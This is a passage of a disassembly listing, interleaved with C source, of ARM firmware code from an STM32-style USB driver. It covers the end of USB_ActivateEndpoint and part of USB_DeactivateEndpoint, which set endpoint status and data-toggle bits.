 80065ce:	781b      	ldrb	r3, [r3, #0]
 80065d0:	009b      	lsls	r3, r3, #2
 80065d2:	4413      	add	r3, r2
 80065d4:	881b      	ldrh	r3, [r3, #0]
 80065d6:	87bb      	strh	r3, [r7, #60]	; 0x3c
 80065d8:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 80065da:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80065de:	2b00      	cmp	r3, #0
 80065e0:	d01b      	beq.n	800661a <USB_ActivateEndpoint+0x57a>
 80065e2:	687a      	ldr	r2, [r7, #4]
 80065e4:	683b      	ldr	r3, [r7, #0]
 80065e6:	781b      	ldrb	r3, [r3, #0]
 80065e8:	009b      	lsls	r3, r3, #2
 80065ea:	4413      	add	r3, r2
 80065ec:	881b      	ldrh	r3, [r3, #0]
 80065ee:	b29b      	uxth	r3, r3
 80065f0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065f4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065f8:	877b      	strh	r3, [r7, #58]	; 0x3a
 80065fa:	687a      	ldr	r2, [r7, #4]
 80065fc:	683b      	ldr	r3, [r7, #0]
 80065fe:	781b      	ldrb	r3, [r3, #0]
 8006600:	009b      	lsls	r3, r3, #2
 8006602:	441a      	add	r2, r3
 8006604:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 8006606:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800660a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800660e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006612:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006616:	b29b      	uxth	r3, r3
 8006618:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800661a:	687a      	ldr	r2, [r7, #4]
 800661c:	683b      	ldr	r3, [r7, #0]
 800661e:	781b      	ldrb	r3, [r3, #0]
 8006620:	009b      	lsls	r3, r3, #2
 8006622:	4413      	add	r3, r2
 8006624:	881b      	ldrh	r3, [r3, #0]
 8006626:	b29b      	uxth	r3, r3
 8006628:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800662c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006630:	873b      	strh	r3, [r7, #56]	; 0x38
 8006632:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006634:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006638:	873b      	strh	r3, [r7, #56]	; 0x38
 800663a:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800663c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006640:	873b      	strh	r3, [r7, #56]	; 0x38
 8006642:	687a      	ldr	r2, [r7, #4]
 8006644:	683b      	ldr	r3, [r7, #0]
 8006646:	781b      	ldrb	r3, [r3, #0]
 8006648:	009b      	lsls	r3, r3, #2
 800664a:	441a      	add	r2, r3
 800664c:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800664e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006652:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006656:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800665a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800665e:	b29b      	uxth	r3, r3
 8006660:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006662:	687a      	ldr	r2, [r7, #4]
 8006664:	683b      	ldr	r3, [r7, #0]
 8006666:	781b      	ldrb	r3, [r3, #0]
 8006668:	009b      	lsls	r3, r3, #2
 800666a:	4413      	add	r3, r2
 800666c:	881b      	ldrh	r3, [r3, #0]
 800666e:	b29b      	uxth	r3, r3
 8006670:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006674:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006678:	86fb      	strh	r3, [r7, #54]	; 0x36
 800667a:	687a      	ldr	r2, [r7, #4]
 800667c:	683b      	ldr	r3, [r7, #0]
 800667e:	781b      	ldrb	r3, [r3, #0]
 8006680:	009b      	lsls	r3, r3, #2
 8006682:	441a      	add	r2, r3
 8006684:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 8006686:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800668a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800668e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006692:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006696:	b29b      	uxth	r3, r3
 8006698:	8013      	strh	r3, [r2, #0]
 800669a:	e0bc      	b.n	8006816 <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800669c:	687a      	ldr	r2, [r7, #4]
 800669e:	683b      	ldr	r3, [r7, #0]
 80066a0:	781b      	ldrb	r3, [r3, #0]
 80066a2:	009b      	lsls	r3, r3, #2
 80066a4:	4413      	add	r3, r2
 80066a6:	881b      	ldrh	r3, [r3, #0]
 80066a8:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80066ac:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80066b0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80066b4:	2b00      	cmp	r3, #0
 80066b6:	d01d      	beq.n	80066f4 <USB_ActivateEndpoint+0x654>
 80066b8:	687a      	ldr	r2, [r7, #4]
 80066ba:	683b      	ldr	r3, [r7, #0]
 80066bc:	781b      	ldrb	r3, [r3, #0]
 80066be:	009b      	lsls	r3, r3, #2
 80066c0:	4413      	add	r3, r2
 80066c2:	881b      	ldrh	r3, [r3, #0]
 80066c4:	b29b      	uxth	r3, r3
 80066c6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066ca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066ce:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80066d2:	687a      	ldr	r2, [r7, #4]
 80066d4:	683b      	ldr	r3, [r7, #0]
 80066d6:	781b      	ldrb	r3, [r3, #0]
 80066d8:	009b      	lsls	r3, r3, #2
 80066da:	441a      	add	r2, r3
 80066dc:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 80066e0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066e4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066e8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80066ec:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066f0:	b29b      	uxth	r3, r3
 80066f2:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80066f4:	687a      	ldr	r2, [r7, #4]
 80066f6:	683b      	ldr	r3, [r7, #0]
 80066f8:	781b      	ldrb	r3, [r3, #0]
 80066fa:	009b      	lsls	r3, r3, #2
 80066fc:	4413      	add	r3, r2
 80066fe:	881b      	ldrh	r3, [r3, #0]
 8006700:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 8006704:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006708:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800670c:	2b00      	cmp	r3, #0
 800670e:	d01d      	beq.n	800674c <USB_ActivateEndpoint+0x6ac>
 8006710:	687a      	ldr	r2, [r7, #4]
 8006712:	683b      	ldr	r3, [r7, #0]
 8006714:	781b      	ldrb	r3, [r3, #0]
 8006716:	009b      	lsls	r3, r3, #2
 8006718:	4413      	add	r3, r2
 800671a:	881b      	ldrh	r3, [r3, #0]
 800671c:	b29b      	uxth	r3, r3
 800671e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006722:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006726:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 800672a:	687a      	ldr	r2, [r7, #4]
 800672c:	683b      	ldr	r3, [r7, #0]
 800672e:	781b      	ldrb	r3, [r3, #0]
 8006730:	009b      	lsls	r3, r3, #2
 8006732:	441a      	add	r2, r3
 8006734:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 8006738:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800673c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006740:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006744:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006748:	b29b      	uxth	r3, r3
 800674a:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800674c:	683b      	ldr	r3, [r7, #0]
 800674e:	78db      	ldrb	r3, [r3, #3]
 8006750:	2b01      	cmp	r3, #1
 8006752:	d024      	beq.n	800679e <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006754:	687a      	ldr	r2, [r7, #4]
 8006756:	683b      	ldr	r3, [r7, #0]
 8006758:	781b      	ldrb	r3, [r3, #0]
 800675a:	009b      	lsls	r3, r3, #2
 800675c:	4413      	add	r3, r2
 800675e:	881b      	ldrh	r3, [r3, #0]
 8006760:	b29b      	uxth	r3, r3
 8006762:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006766:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800676a:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 800676e:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006772:	f083 0320 	eor.w	r3, r3, #32
 8006776:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 800677a:	687a      	ldr	r2, [r7, #4]
 800677c:	683b      	ldr	r3, [r7, #0]
 800677e:	781b      	ldrb	r3, [r3, #0]
 8006780:	009b      	lsls	r3, r3, #2
 8006782:	441a      	add	r2, r3
 8006784:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006788:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800678c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006790:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006794:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006798:	b29b      	uxth	r3, r3
 800679a:	8013      	strh	r3, [r2, #0]
 800679c:	e01d      	b.n	80067da <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800679e:	687a      	ldr	r2, [r7, #4]
 80067a0:	683b      	ldr	r3, [r7, #0]
 80067a2:	781b      	ldrb	r3, [r3, #0]
 80067a4:	009b      	lsls	r3, r3, #2
 80067a6:	4413      	add	r3, r2
 80067a8:	881b      	ldrh	r3, [r3, #0]
 80067aa:	b29b      	uxth	r3, r3
 80067ac:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067b0:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80067b4:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80067b8:	687a      	ldr	r2, [r7, #4]
 80067ba:	683b      	ldr	r3, [r7, #0]
 80067bc:	781b      	ldrb	r3, [r3, #0]
 80067be:	009b      	lsls	r3, r3, #2
 80067c0:	441a      	add	r2, r3
 80067c2:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80067c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ce:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067d6:	b29b      	uxth	r3, r3
 80067d8:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80067da:	687a      	ldr	r2, [r7, #4]
 80067dc:	683b      	ldr	r3, [r7, #0]
 80067de:	781b      	ldrb	r3, [r3, #0]
 80067e0:	009b      	lsls	r3, r3, #2
 80067e2:	4413      	add	r3, r2
 80067e4:	881b      	ldrh	r3, [r3, #0]
 80067e6:	b29b      	uxth	r3, r3
 80067e8:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80067ec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067f0:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80067f4:	687a      	ldr	r2, [r7, #4]
 80067f6:	683b      	ldr	r3, [r7, #0]
 80067f8:	781b      	ldrb	r3, [r3, #0]
 80067fa:	009b      	lsls	r3, r3, #2
 80067fc:	441a      	add	r2, r3
 80067fe:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8006802:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006806:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800680a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800680e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006812:	b29b      	uxth	r3, r3
 8006814:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 8006816:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 800681a:	4618      	mov	r0, r3
 800681c:	3774      	adds	r7, #116	; 0x74
 800681e:	46bd      	mov	sp, r7
 8006820:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006824:	4770      	bx	lr
 8006826:	bf00      	nop

08006828 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006828:	b480      	push	{r7}
 800682a:	b08d      	sub	sp, #52	; 0x34
 800682c:	af00      	add	r7, sp, #0
 800682e:	6078      	str	r0, [r7, #4]
 8006830:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8006832:	683b      	ldr	r3, [r7, #0]
 8006834:	7b1b      	ldrb	r3, [r3, #12]
 8006836:	2b00      	cmp	r3, #0
 8006838:	f040 808e 	bne.w	8006958 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 800683c:	683b      	ldr	r3, [r7, #0]
 800683e:	785b      	ldrb	r3, [r3, #1]
 8006840:	2b00      	cmp	r3, #0
 8006842:	d044      	beq.n	80068ce <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006844:	687a      	ldr	r2, [r7, #4]
 8006846:	683b      	ldr	r3, [r7, #0]
 8006848:	781b      	ldrb	r3, [r3, #0]
 800684a:	009b      	lsls	r3, r3, #2
 800684c:	4413      	add	r3, r2
 800684e:	881b      	ldrh	r3, [r3, #0]
 8006850:	81bb      	strh	r3, [r7, #12]
 8006852:	89bb      	ldrh	r3, [r7, #12]
 8006854:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006858:	2b00      	cmp	r3, #0
 800685a:	d01b      	beq.n	8006894 <USB_DeactivateEndpoint+0x6c>
 800685c:	687a      	ldr	r2, [r7, #4]
 800685e:	683b      	ldr	r3, [r7, #0]
 8006860:	781b      	ldrb	r3, [r3, #0]
 8006862:	009b      	lsls	r3, r3, #2
 8006864:	4413      	add	r3, r2
 8006866:	881b      	ldrh	r3, [r3, #0]
 8006868:	b29b      	uxth	r3, r3
 800686a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800686e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006872:	817b      	strh	r3, [r7, #10]
 8006874:	687a      	ldr	r2, [r7, #4]
 8006876:	683b      	ldr	r3, [r7, #0]
 8006878:	781b      	ldrb	r3, [r3, #0]
 800687a:	009b      	lsls	r3, r3, #2
 800687c:	441a      	add	r2, r3
 800687e:	897b      	ldrh	r3, [r7, #10]
 8006880:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006884:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006888:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800688c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006890:	b29b      	uxth	r3, r3
 8006892:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006894:	687a      	ldr	r2, [r7, #4]
 8006896:	683b      	ldr	r3, [r7, #0]
 8006898:	781b      	ldrb	r3, [r3, #0]
 800689a:	009b      	lsls	r3, r3, #2
 800689c:	4413      	add	r3, r2
 800689e:	881b      	ldrh	r3, [r3, #0]
 80068a0:	b29b      	uxth	r3, r3
 80068a2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068a6:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80068aa:	813b      	strh	r3, [r7, #8]
 80068ac:	687a      	ldr	r2, [r7, #4]
 80068ae:	683b      	ldr	r3, [r7, #0]
 80068b0:	781b      	ldrb	r3, [r3, #0]
 80068b2:	009b      	lsls	r3, r3, #2
 80068b4:	441a      	add	r2, r3
 80068b6:	893b      	ldrh	r3, [r7, #8]
 80068b8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068bc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068c0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068c4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068c8:	b29b      	uxth	r3, r3
 80068ca:	8013      	strh	r3, [r2, #0]
 80068cc:	e192      	b.n	8006bf4 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068ce:	687a      	ldr	r2, [r7, #4]
 80068d0:	683b      	ldr	r3, [r7, #0]
 80068d2:	781b      	ldrb	r3, [r3, #0]
 80068d4:	009b      	lsls	r3, r3, #2
 80068d6:	4413      	add	r3, r2
 80068d8:	881b      	ldrh	r3, [r3, #0]
 80068da:	827b      	strh	r3, [r7, #18]
 80068dc:	8a7b      	ldrh	r3, [r7, #18]
 80068de:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068e2:	2b00      	cmp	r3, #0
 80068e4:	d01b      	beq.n	800691e <USB_DeactivateEndpoint+0xf6>
 80068e6:	687a      	ldr	r2, [r7, #4]
 80068e8:	683b      	ldr	r3, [r7, #0]
 80068ea:	781b      	ldrb	r3, [r3, #0]
 80068ec:	009b      	lsls	r3, r3, #2
 80068ee:	4413      	add	r3, r2
 80068f0:	881b      	ldrh	r3, [r3, #0]
 80068f2:	b29b      	uxth	r3, r3
 80068f4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068f8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068fc:	823b      	strh	r3, [r7, #16]
 80068fe:	687a      	ldr	r2, [r7, #4]
 8006900:	683b      	ldr	r3, [r7, #0]
 8006902:	781b      	ldrb	r3, [r3, #0]
 8006904:	009b      	lsls	r3, r3, #2
 8006906:	441a      	add	r2, r3
 8006908:	8a3b      	ldrh	r3, [r7, #16]
 800690a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800690e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006912:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006916:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800691a:	b29b      	uxth	r3, r3
 800691c:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800691e:	687a      	ldr	r2, [r7, #4]
 8006920:	683b      	ldr	r3, [r7, #0]
 8006922:	781b      	ldrb	r3, [r3, #0]
 8006924:	009b      	lsls	r3, r3, #2
 8006926:	4413      	add	r3, r2
 8006928:	881b      	ldrh	r3, [r3, #0]
 800692a:	b29b      	uxth	r3, r3
 800692c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006930:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006934:	81fb      	strh	r3, [r7, #14]
 8006936:	687a      	ldr	r2, [r7, #4]
 8006938:	683b      	ldr	r3, [r7, #0]
 800693a:	781b      	ldrb	r3, [r3, #0]
 800693c:	009b      	lsls	r3, r3, #2
 800693e:	441a      	add	r2, r3
 8006940:	89fb      	ldrh	r3, [r7, #14]
 8006942:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006946:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800694a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800694e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006952:	b29b      	uxth	r3, r3
 8006954:	8013      	strh	r3, [r2, #0]
 8006956:	e14d      	b.n	8006bf4 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006958:	683b      	ldr	r3, [r7, #0]
 800695a:	785b      	ldrb	r3, [r3, #1]
 800695c:	2b00      	cmp	r3, #0
 800695e:	f040 80a5 	bne.w	8006aac <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006962:	687a      	ldr	r2, [r7, #4]
 8006964:	683b      	ldr	r3, [r7, #0]
 8006966:	781b      	ldrb	r3, [r3, #0]
 8006968:	009b      	lsls	r3, r3, #2
 800696a:	4413      	add	r3, r2
 800696c:	881b      	ldrh	r3, [r3, #0]
 800696e:	843b      	strh	r3, [r7, #32]
 8006970:	8c3b      	ldrh	r3, [r7, #32]
 8006972:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006976:	2b00      	cmp	r3, #0
 8006978:	d01b      	beq.n	80069b2 <USB_DeactivateEndpoint+0x18a>
 800697a:	687a      	ldr	r2, [r7, #4]
 800697c:	683b      	ldr	r3, [r7, #0]
 800697e:	781b      	ldrb	r3, [r3, #0]
 8006980:	009b      	lsls	r3, r3, #2
 8006982:	4413      	add	r3, r2
 8006984:	881b      	ldrh	r3, [r3, #0]
 8006986:	b29b      	uxth	r3, r3
 8006988:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800698c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006990:	83fb      	strh	r3, [r7, #30]
 8006992:	687a      	ldr	r2, [r7, #4]
 8006994:	683b      	ldr	r3, [r7, #0]
 8006996:	781b      	ldrb	r3, [r3, #0]
 8006998:	009b      	lsls	r3, r3, #2
 800699a:	441a      	add	r2, r3
 800699c:	8bfb      	ldrh	r3, [r7, #30]
 800699e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069a2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069a6:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80069aa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069ae:	b29b      	uxth	r3, r3
 80069b0:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80069b2:	687a      	ldr	r2, [r7, #4]
 80069b4:	683b      	ldr	r3, [r7, #0]
 80069b6:	781b      	ldrb	r3, [r3, #0]
 80069b8:	009b      	lsls	r3, r3, #2
 80069ba:	4413      	add	r3, r2
 80069bc:	881b      	ldrh	r3, [r3, #0]
 80069be:	83bb      	strh	r3, [r7, #28]
 80069c0:	8bbb      	ldrh	r3, [r7, #28]
 80069c2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80069c6:	2b00      	cmp	r3, #0
 80069c8:	d01b      	beq.n	8006a02 <USB_DeactivateEndpoint+0x1da>
 80069ca:	687a      	ldr	r2, [r7, #4]
 80069cc:	683b      	ldr	r3, [r7, #0]
 80069ce:	781b      	ldrb	r3, [r3, #0]
 80069d0:	009b      	lsls	r3, r3, #2
 80069d2:	4413      	add	r3, r2
 80069d4:	881b      	ldrh	r3, [r3, #0]
 80069d6:	b29b      	uxth	r3, r3
 80069d8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069dc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069e0:	837b      	strh	r3, [r7, #26]
 80069e2:	687a      	ldr	r2, [r7, #4]
 80069e4:	683b      	ldr	r3, [r7, #0]
 80069e6:	781b      	ldrb	r3, [r3, #0]
 80069e8:	009b      	lsls	r3, r3, #2
 80069ea:	441a      	add	r2, r3
 80069ec:	8b7b      	ldrh	r3, [r7, #26]
 80069ee:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069f2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069f6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069fa:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80069fe:	b29b      	uxth	r3, r3
 8006a00:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 8006a02:	687a      	ldr	r2, [r7, #4]
 8006a04:	683b      	ldr	r3, [r7, #0]
 8006a06:	781b      	ldrb	r3, [r3, #0]
 8006a08:	009b      	lsls	r3, r3, #2
 8006a0a:	4413      	add	r3, r2
 8006a0c:	881b      	ldrh	r3, [r3, #0]
 8006a0e:	b29b      	uxth	r3, r3
 8006a10:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a14:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a18:	833b      	strh	r3, [r7, #24]
 8006a1a:	687a      	ldr	r2, [r7, #4]
 8006a1c:	683b      	ldr	r3, [r7, #0]
 8006a1e:	781b      	ldrb	r3, [r3, #0]
 8006a20:	009b      	lsls	r3, r3, #2
 8006a22:	441a      	add	r2, r3
 8006a24:	8b3b      	ldrh	r3, [r7, #24]
 8006a26:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a2a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a2e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a32:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006a36:	b29b      	uxth	r3, r3
 8006a38:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006a3a:	687a      	ldr	r2, [r7, #4]
 8006a3c:	683b      	ldr	r3, [r7, #0]
 8006a3e:	781b      	ldrb	r3, [r3, #0]
 8006a40:	009b      	lsls	r3, r3, #2
 8006a42:	4413      	add	r3, r2
 8006a44:	881b      	ldrh	r3, [r3, #0]
 8006a46:	b29b      	uxth	r3, r3
 8006a48:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006a4c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a50:	82fb      	strh	r3, [r7, #22]
 8006a52:	687a      	ldr	r2, [r7, #4]
 8006a54:	683b      	ldr	r3, [r7, #0]
 8006a56:	781b      	ldrb	r3, [r3, #0]
 8006a58:	009b      	lsls	r3, r3, #2
 8006a5a:	441a      	add	r2, r3
 8006a5c:	8afb      	ldrh	r3, [r7, #22]
 8006a5e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a62:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a66:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a6a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a6e:	b29b      	uxth	r3, r3
 8006a70:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006a72:	687a      	ldr	r2, [r7, #4]
 8006a74:	683b      	ldr	r3, [r7, #0]
 8006a76:	781b      	ldrb	r3, [r3, #0]
 8006a78:	009b      	lsls	r3, r3, #2
 8006a7a:	4413      	add	r3, r2
 8006a7c:	881b      	ldrh	r3, [r3, #0]
 8006a7e:	b29b      	uxth	r3, r3
 8006a80:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a84:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006a88:	82bb      	strh	r3, [r7, #20]
 8006a8a:	687a      	ldr	r2, [r7, #4]
 8006a8c:	683b      	ldr	r3, [r7, #0]
 8006a8e:	781b      	ldrb	r3, [r3, #0]
 8006a90:	009b      	lsls	r3, r3, #2
 8006a92:	441a      	add	r2, r3
 8006a94:	8abb      	ldrh	r3, [r7, #20]
 8006a96:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a9a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a9e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006aa2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006aa6:	b29b      	uxth	r3, r3
 8006aa8:	8013      	strh	r3, [r2, #0]
 8006aaa:	e0a3      	b.n	8006bf4 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006aac:	687a      	ldr	r2, [r7, #4]
 8006aae:	683b      	ldr	r3, [r7, #0]
 8006ab0:	781b      	ldrb	r3, [r3, #0]
 8006ab2:	009b      	lsls	r3, r3, #2
 8006ab4:	4413      	add	r3, r2
